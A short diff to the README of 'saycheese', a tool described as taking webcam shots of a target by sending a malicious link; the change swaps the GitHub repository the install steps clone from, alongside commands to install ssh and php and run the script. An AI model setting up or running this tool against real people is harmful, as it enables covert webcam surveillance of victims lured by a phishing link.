@@ -16,7 +16,7 @@ Take webcam shots from target just sending a malicious link
 ```
 # apt install ssh / Termux: apt install openssh
 # apt install php
-# git clone https://github.com/Hash-Nooby/saycheese
+# git clone https://github.com/hashs3c/saycheese
 # cd saycheese
 # bash saycheese.sh
 ```
